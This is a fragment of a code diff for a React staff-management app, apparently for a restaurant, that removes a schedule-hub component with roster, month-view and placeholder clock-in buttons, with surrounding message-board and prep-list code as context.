       if (typeof logAudit === 'function') logAudit(appUser, 'DELETE_STAFF', 'Team Roster', 'Permanently removed a staff member.'); 
     } 
   };
@@ -605,121 +732,6 @@ const TabTeam = ({ appUser, users, addToast }) => {
   );
 };
 
-// --- MASTER SCHEDULE HUB (Section 3 & 6 UI) ---
-const TabMasterSchedule = ({ currentDate, appUser, users, shifts, shiftSwaps, events, addToast }) => {
-  const [subTab, setSubTab] = useState('my-schedule');
-  const monthStr = getMonthStr(currentDate);
-  const myNextShift = shifts.find(s => s.employeeId === appUser.id && s.date >= getToday() && s.isPublished);
-
-  // Copper Aesthetic Tokens
-  const copperGradient = "bg-gradient-to-r from-[#C59373] to-[#8F6040]";
-  const darkCard = "bg-[#1A2126] border border-[#2A353D]";
-
-  return (
-    <div className="max-w-md mx-auto space-y-4 pb-24">
-      {/* Sub-Navigation Pills */}
-      <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar">
-        {['my-schedule', 'full-schedule', 'month-view'].map((tab) => (
-          <button 
-            key={tab} onClick={() => setSubTab(tab)}
-            className={`px-4 py-2 text-xs font-bold rounded-xl capitalize whitespace-nowrap transition-all ${subTab === tab ? `${copperGradient} text-slate-900 shadow-md` : 'bg-[#1A2126] text-slate-400 border border-[#2A353D]'}`}
-          >
-            {tab.replace('-', ' ')}
-          </button>
-        ))}
-      </div>
-
-      {/* SUB TAB: MY SCHEDULE & TIME CLOCK */}
-      {subTab === 'my-schedule' && (
-        <div className="space-y-4 animate-[slideIn_0.2s_ease-out]">
-          
-          {/* Important Alerts Banner */}
-          {events.filter(e => e.type === 'note' && e.isImportant).slice(0,1).map(alert => (
-            <div key={alert.id} className="bg-gradient-to-r from-[#7A4F31]/30 to-[#1A2126] border border-[#B88764]/40 p-3 rounded-xl flex gap-3 shadow-lg">
-              <span className="text-xl">🔔</span>
-              <div>
-                <span className="text-[9px] font-black uppercase text-[#D4A381] tracking-widest block">System Alert</span>
-                <p className="text-xs text-slate-200 font-medium leading-snug">{alert.title}</p>
-              </div>
-            </div>
-          ))}
-
-          {/* Master Copper Hero Card */}
-          <div className={`${copperGradient} rounded-3xl p-6 shadow-2xl relative overflow-hidden border border-[#D4A381]/30`}>
-            <div className="absolute -top-4 -right-4 text-8xl font-black text-slate-900/10">86</div>
-            <h3 className="text-sm font-black uppercase tracking-widest text-slate-900/60 mb-1">My Schedule</h3>
-            
-            {myNextShift ? (
-              <div className="mb-6">
-                <div className="text-2xl font-black text-slate-900 tracking-tight leading-none mb-1">Next: {myNextShift.role}</div>
-                <div className="text-sm font-bold text-slate-900/80 flex items-center gap-1.5">
-                  {formatDisplayDate(myNextShift.date)} • {formatShortTime(myNextShift.startTime)} - {formatShortTime(myNextShift.endTime)}
-                  {myNextShift.endTime === 'CLOSE' && <span className="bg-slate-900 text-[#D4A381] text-[9px] px-1.5 py-0.5 rounded ml-1 uppercase tracking-wider">Close</span>}
-                </div>
-              </div>
-            ) : (
-              <div className="mb-6 text-slate-900 font-bold">No upcoming shifts scheduled.</div>
-            )}
-
-            <button 
-              onClick={() => alert("Time Clock Geofencing Engine initializing...")}
-              className="w-full py-4 bg-slate-900 text-white rounded-xl font-black text-sm uppercase tracking-widest shadow-xl hover:bg-slate-800 transition-colors"
-            >
-              CLOCK IN / OUT
-            </button>
-          </div>
-
-          {/* Quick Action Grid */}
-          <div className="grid grid-cols-2 gap-3">
-            <button onClick={() => alert("Trade Matrix initialized.")} className={`${darkCard} p-4 rounded-2xl flex flex-col items-center justify-center gap-2 hover:bg-[#2A353D] transition-colors`}>
-              <span className="text-xl">🔄</span>
-              <span className="text-[10px] font-bold uppercase tracking-wider text-slate-300">Offer Shift</span>
-            </button>
-            <button onClick={() => alert("Routing to Time Off Request Engine...")} className={`${darkCard} p-4 rounded-2xl flex flex-col items-center justify-center gap-2 hover:bg-[#2A353D] transition-colors`}>
-              <span className="text-xl">🏖️</span>
-              <span className="text-[10px] font-bold uppercase tracking-wider text-slate-300">Request Off</span>
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* SUB TAB: FULL SCHEDULE ROSTER */}
-      {subTab === 'full-schedule' && (
-        <div className={`${darkCard} rounded-2xl overflow-hidden shadow-xl animate-[slideIn_0.2s_ease-out]`}>
-          <div className="bg-slate-900/50 p-3 border-b border-[#2A353D]">
-            <h3 className="text-xs font-black uppercase tracking-widest text-[#D4A381]">Active Roster</h3>
-          </div>
-          <div className="divide-y divide-[#2A353D]/50">
-            {shifts.filter(s => s.date >= getToday() && s.isPublished).slice(0, 10).map(shift => {
-               const emp = users.find(u => u.id === shift.employeeId);
-               return (
-                 <div key={shift.id} className="p-3 flex justify-between items-center bg-[#1A2126]">
-                   <div className="flex items-center gap-3">
-                     <img src={getAvatar(emp?.name, emp?.photoURL)} className="w-8 h-8 rounded-full border border-[#2A353D]" alt="avatar"/>
-                     <div>
-                       <div className="text-sm font-bold text-white">{emp?.name.split(' ')[0]}</div>
-                       <div className="text-[9px] text-slate-400 font-bold uppercase">{formatDisplayDate(shift.date)}</div>
-                     </div>
-                   </div>
-                   <div className="text-xs font-mono font-bold bg-[#12161A] text-slate-300 px-2 py-1 rounded-md border border-[#2A353D]">
-                     {formatShortTime(shift.startTime)} - {formatShortTime(shift.endTime)}
-                   </div>
-                 </div>
-               )
-            })}
-          </div>
-        </div>
-      )}
-
-      {/* SUB TAB: MONTH VIEW */}
-      {subTab === 'month-view' && (
-        <div className="animate-[slideIn_0.2s_ease-out]">
-          <TabMonth currentDate={currentDate} users={users} shifts={shifts} />
-        </div>
-      )}
-    </div>
-  );
-};
 // --- MESSAGE BOARD (With Avatars) ---
 const TabMessages = ({ events, appUser, users, addToast }) => {
   const [message, setMessage] = useState(''); const allNotes = events.filter(e => e.type === 'note').sort((a,b) => new Date(b.date) - new Date(a.date));
@@ -906,7 +918,6 @@ const TabSchedule = ({ currentDate, users, shifts, events, timeOffRequests, addT
     </div>
   );
 };
-
 
 // --- PREP LIST (Normal UI - Triggers the App-Level Print Screen) ---
 const TabPrep = ({ currentDate, prepItems, appUser, setLabelsToPrint }) => {
